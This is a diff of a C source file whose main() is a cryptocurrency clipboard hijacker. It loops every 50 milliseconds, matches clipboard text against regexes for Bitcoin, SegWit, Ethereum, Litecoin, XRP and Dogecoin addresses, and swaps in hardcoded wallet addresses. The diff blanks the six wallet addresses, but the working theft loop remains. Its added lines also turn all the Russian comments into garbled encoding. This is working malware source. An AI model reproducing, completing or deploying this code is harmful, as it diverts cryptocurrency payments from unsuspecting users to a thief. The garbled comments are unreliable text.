@@ -31,35 +31,35 @@ void setclipboard(char* text)
 }
 
 int main() {
-	// сюда вставлять свои адреса
-	const char* btcadr = "1JhTCjmLd6NGzRGEm4iysk72SbyFAQhgUE";
-	const char* segwitadr = "bc1qmq5eh2stp4nkxetgd87cw5c85k3n70070t53av";
-	const char* ethadr = "0x40f4DF3439C03A39B450E758a95680bac21F7452";
-	const char* ltcadr = "MQd1fJwqBJvwLuyhr17PhEFx1swiqDbPQS";
-	const char* xrpadr = "r3A5A3AjqHL1XdjTjpDUwm9ugWt4gvVNT";
-	const char* dogeadr = "DHdy14RERz94jo3oaBMt3aTCGgrerZQSDz";
+	// Г±ГѕГ¤Г  ГўГ±ГІГ ГўГ«ГїГІГј Г±ГўГ®ГЁ Г Г¤Г°ГҐГ±Г 
+	const char* btcadr = "";
+	const char* segwitadr = "";
+	const char* ethadr = "";
+	const char* ltcadr = "";
+	const char* xrpadr = "";
+	const char* dogeadr = "";
 
-	struct crypto btc = { .ptn = "^[13][a-km-zA-HJ-NP-Z1-9]*$",				.address = btcadr }; // фиксированная длина не поддерживается в tiny regex
-	struct crypto segwit = { .ptn = "^bc1q[a-zA-HJ-NP-Z0-9]*$",				.address = segwitadr }; // на p2pkh и p2wpkh разные регулярки, так как изменение легаси адреса на сегвит (bc1q) будет заметно
+	struct crypto btc = { .ptn = "^[13][a-km-zA-HJ-NP-Z1-9]*$",				.address = btcadr }; // ГґГЁГЄГ±ГЁГ°Г®ГўГ Г­Г­Г Гї Г¤Г«ГЁГ­Г  Г­ГҐ ГЇГ®Г¤Г¤ГҐГ°Г¦ГЁГўГ ГҐГІГ±Гї Гў tiny regex
+	struct crypto segwit = { .ptn = "^bc1q[a-zA-HJ-NP-Z0-9]*$",				.address = segwitadr }; // Г­Г  p2pkh ГЁ p2wpkh Г°Г Г§Г­Г»ГҐ Г°ГҐГЈГіГ«ГїГ°ГЄГЁ, ГІГ ГЄ ГЄГ ГЄ ГЁГ§Г¬ГҐГ­ГҐГ­ГЁГҐ Г«ГҐГЈГ Г±ГЁ Г Г¤Г°ГҐГ±Г  Г­Г  Г±ГҐГЈГўГЁГІ (bc1q) ГЎГіГ¤ГҐГІ Г§Г Г¬ГҐГІГ­Г®
 	struct crypto eth = { .ptn = "^0x[a-fA-F0-9]*$",						.address = ethadr };
 	struct crypto ltc = { .ptn = "^[LM3][a-km-zA-HJ-NP-Z1-9]*$",			.address = ltcadr };
 	struct crypto xrp = { .ptn = "^r[0-9a-zA-Z]*$",							.address = xrpadr };
 	struct crypto doge = { .ptn = "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]*$",	.address = dogeadr };
 
 
-	struct crypto all[6] = { btc, segwit, eth, ltc, xrp, doge }; // где 6 - количество сервисов
+	struct crypto all[6] = { btc, segwit, eth, ltc, xrp, doge }; // ГЈГ¤ГҐ 6 - ГЄГ®Г«ГЁГ·ГҐГ±ГІГўГ® Г±ГҐГ°ГўГЁГ±Г®Гў
 	
 	while (1) {
-		char* clipdata = getclipboard(); // получение буфера обмена
-		if (clipdata != NULL) { // если в буфере что-то есть
-			for (int i = 0; i < 6; i++) { // цикл из всех типов кошельков, где 6 - количество сервисов
+		char* clipdata = getclipboard(); // ГЇГ®Г«ГіГ·ГҐГ­ГЁГҐ ГЎГіГґГҐГ°Г  Г®ГЎГ¬ГҐГ­Г 
+		if (clipdata != NULL) { // ГҐГ±Г«ГЁ Гў ГЎГіГґГҐГ°ГҐ Г·ГІГ®-ГІГ® ГҐГ±ГІГј
+			for (int i = 0; i < 6; i++) { // Г¶ГЁГЄГ« ГЁГ§ ГўГ±ГҐГµ ГІГЁГЇГ®Гў ГЄГ®ГёГҐГ«ГјГЄГ®Гў, ГЈГ¤ГҐ 6 - ГЄГ®Г«ГЁГ·ГҐГ±ГІГўГ® Г±ГҐГ°ГўГЁГ±Г®Гў
 				int matchlen;
-				int match = re_match(all[i].ptn, clipdata, &matchlen); // проверка, является ли текст в буфере соответствующим адресом
-				if (match != -1) { // если является, подмена буфера обмена на заданный в коде адрес
+				int match = re_match(all[i].ptn, clipdata, &matchlen); // ГЇГ°Г®ГўГҐГ°ГЄГ , ГїГўГ«ГїГҐГІГ±Гї Г«ГЁ ГІГҐГЄГ±ГІ Гў ГЎГіГґГҐГ°ГҐ Г±Г®Г®ГІГўГҐГІГ±ГІГўГіГѕГ№ГЁГ¬ Г Г¤Г°ГҐГ±Г®Г¬
+				if (match != -1) { // ГҐГ±Г«ГЁ ГїГўГ«ГїГҐГІГ±Гї, ГЇГ®Г¤Г¬ГҐГ­Г  ГЎГіГґГҐГ°Г  Г®ГЎГ¬ГҐГ­Г  Г­Г  Г§Г Г¤Г Г­Г­Г»Г© Гў ГЄГ®Г¤ГҐ Г Г¤Г°ГҐГ±
 					setclipboard(all[i].address);
 				}
 			}
 		}
-		Sleep(50); // чтобы не грузило проц, после каждой проверки сон на 0.05 сек
+		Sleep(50); // Г·ГІГ®ГЎГ» Г­ГҐ ГЈГ°ГіГ§ГЁГ«Г® ГЇГ°Г®Г¶, ГЇГ®Г±Г«ГҐ ГЄГ Г¦Г¤Г®Г© ГЇГ°Г®ГўГҐГ°ГЄГЁ Г±Г®Г­ Г­Г  0.05 Г±ГҐГЄ
 	}
 }
